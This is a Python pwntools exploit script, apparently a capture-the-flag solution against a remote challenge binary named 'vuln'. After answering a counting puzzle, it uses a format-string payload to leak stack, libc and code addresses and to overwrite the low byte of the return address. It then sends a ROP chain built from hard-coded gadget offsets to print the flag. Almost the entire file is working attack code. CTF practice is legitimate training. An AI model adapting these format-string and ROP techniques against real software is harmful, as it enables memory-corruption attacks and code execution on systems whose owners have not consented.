#!/usr/bin/env python3

import pwngadgets
from pwn import *

exe = ELF("vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript='''
set follow-fork-mode parent
c
''')
    else:
        r = remote("xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.rdocker.vuln.land", 1337)

    return r


def main():
    r = conn()

    r.sendlineafter(b'?', b'y')

    presents = r.recvuntil(b'>')

    red = str(presents.count(b'red')-1).encode()
    yellow = str(presents.count(b'yellow')).encode()
    blue = str(presents.count(b'blue')).encode()

    r.sendline(red)
    r.sendlineafter(b'>', yellow)
    r.sendlineafter(b'>', blue)         # solve task

    r.sendlineafter(b'>', b'')

    payload1 = flat({0:b'%p '*50, 167:chr(0x9b).encode()})          # formatstring vuln and override lowest byte of return address to run tellflag twice

    r.sendlineafter(b'>', payload1)

    leak = r.recvuntil(b'.')
    #l = pwngadgets.Leak(leak, r)
    #print(l.getSegment('libc', hasToHaveIndexInLeak=True))
    leakedSegments = re.findall(b'(0x[0-9a-fA-F]+)|\\(nil\\)', leak)
    print(leakedSegments[38], leakedSegments[4])
    function, stack, libc = [int(leakedSegments[28], 16) - 0x176c, int(leakedSegments[0], 16) - 0x1ed50, int(leakedSegments[38], 16) - 0x23a90]     # formatstring processing
    info(f'libc: {hex(libc)}, functions: {hex(function)}, stack:{hex(stack)}'.encode())

    # rop-chain: 'pop rsi' 'buffer_address' 'pop rdi' 'buffer_address' 'getstr' 'pop rdx' 'heap offset' 'add rax, rdx' 'error+43'
    payload = flat({168:[0x2573e+libc, 0x1F690+stack, 0x240e5+libc, 0x1F690+stack, 0x139D+-0xf+function, 0x26302+libc, pack(-0x26E-0x180, 64), 0x76a7a+libc, 0x130E+function, 0x1354+function]})

    r.sendlineafter(b'>', b'')
    r.sendlineafter(b'>', payload)
    r.sendlineafter(b'>', b'')      # answer getstr prompt to get heap address

    r.recvuntil(b'>')
    info(b'flag: HV' + r.recvall()[1:])
if __name__ == "__main__":
    main()